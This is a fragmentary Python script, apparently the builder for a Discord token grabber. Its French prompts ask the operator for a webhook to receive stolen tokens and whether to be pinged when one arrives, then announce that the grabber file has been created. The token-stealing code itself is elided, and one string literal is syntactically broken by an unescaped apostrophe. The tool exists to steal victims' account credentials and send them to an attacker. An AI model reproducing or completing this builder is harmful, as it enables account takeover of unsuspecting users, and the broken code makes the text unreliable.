...
ready_data = [{
    ...
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'Je suis pret a trouver d'autre token!',
            "inline": True
        }
    ],
...
def main():
    ...
    webhook = Write.Input("Entre le weebhook puis appuie sur entrer -> ",
                          Colors.red_to_blue, interval=0.005)

    if not webhook.strip():
        Colorate.Error("Entre un weebhook valide!")
        return

    ping = Write.Input("Souhaitez-vous être pingé lorsque vous obtenez un Token [y/n] -> ",
                       Colors.red_to_blue, interval=0.005)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Entrer obligatoirement 'y' ou 'n'!")
        return
    ...
    print()
    Write.Input("le token grabber a été crée danns le dossier!", Colors.red_to_blue, interval=0.005)
    return exit()
